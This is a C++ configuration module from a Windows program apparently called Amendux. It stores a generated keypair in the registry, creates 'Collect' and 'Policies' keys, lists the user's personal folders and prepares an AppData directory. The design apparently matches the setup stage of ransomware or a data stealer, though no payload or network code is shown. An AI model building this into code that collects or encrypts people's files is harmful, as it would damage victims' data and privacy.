#include "stdafx.h"
#include "Log.h"
#include "Encrypt.h"
#include "RegDB.h"
#include "Config.h"

using namespace Amendux;

void Config::Init(Encrypt& encrypt)
{
	Log::Instance()->write(L"Config", L"Initialize config module");

	ShowEnvironment();
	InitDataDir();

	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux\\Crypt");
	LPBYTE dRsPubkey = RegDB::getValue<LPBYTE>(hRoot, REG_BINARY, L"clientPubkey", crypto_box_PUBLICKEYBYTES);
	LPBYTE dRsPrivkey = RegDB::getValue<LPBYTE>(hRoot, REG_BINARY, L"clientPrivkey", crypto_box_SECRETKEYBYTES);
	if (!dRsPubkey || !dRsPrivkey) {
		encrypt.genLocalKeypair();

		RegDB::setValue<LPBYTE>(hRoot, REG_BINARY, L"clientPubkey", encrypt.clientPublickey(), crypto_box_PUBLICKEYBYTES);
		RegDB::setValue<LPBYTE>(hRoot, REG_BINARY, L"clientPrivkey", encrypt.clientPrivatekey(), crypto_box_SECRETKEYBYTES);

		Log::Instance()->write(L"Config", L"Client keys generated and set");
	}
	else {
		encrypt.setLocalKeypair(dRsPubkey, dRsPrivkey);
	}

	hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux\\Collect");
	hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux\\Policies");

	DWORD procInit = 1;
	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"InitProcedure", &procInit, sizeof(DWORD));

	DWORD execMode = 3;
	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"ExecMode", &execMode, sizeof(DWORD));
}


void Config::ShowEnvironment()
{
	PWCHAR sUserDir;

	sUserDir = Util::getDirectory(Util::Directory::USER_DOCUMENTS);
	Log::Instance()->write(L"Config", L"[Env] User document: " + std::wstring(sUserDir));

	sUserDir = Util::getDirectory(Util::Directory::USER_CONTACT);
	Log::Instance()->write(L"Config", L"[Env] User contact: " + std::wstring(sUserDir));

	sUserDir = Util::getDirectory(Util::Directory::USER_DESKTOP);
	Log::Instance()->write(L"Config", L"[Env] User desktop: " + std::wstring(sUserDir));

	sUserDir = Util::getDirectory(Util::Directory::USER_DOWNLOAD);
	Log::Instance()->write(L"Config", L"[Env] User download: " + std::wstring(sUserDir));

	sUserDir = Util::getDirectory(Util::Directory::USER_FAVORITE);
	Log::Instance()->write(L"Config", L"[Env] User favorite: " + std::wstring(sUserDir));

	sUserDir = Util::getDirectory(Util::Directory::USER_APPDATA);
	Log::Instance()->write(L"Config", L"[Env] User appdata: " + std::wstring(sUserDir));

	sUserDir = Util::getDirectory(Util::Directory::USER_PICTURES);
	Log::Instance()->write(L"Config", L"[Env] User pictures: " + std::wstring(sUserDir));

	sUserDir = Util::getDirectory(Util::Directory::USER_MUSIC);
	Log::Instance()->write(L"Config", L"[Env] User music: " + std::wstring(sUserDir));

	sUserDir = Util::getDirectory(Util::Directory::USER_VIDEOS);
	Log::Instance()->write(L"Config", L"[Env] User videos: " + std::wstring(sUserDir));
}


void Config::InitDataDir()
{
	std::wstring dataDir = std::wstring(Util::getDirectory(Util::Directory::USER_APPDATA));
	if (CreateDirectory((dataDir + L"\\Amendux").c_str(), NULL) || ERROR_ALREADY_EXISTS == GetLastError()) {
		// CopyFile(...)
	} else {
		std::cerr << "Cannot create temp directory" << std::endl;
	}
}


void Config::Terminate()
{
	Log::Instance()->write(L"Config", L"Terminate config module");
}
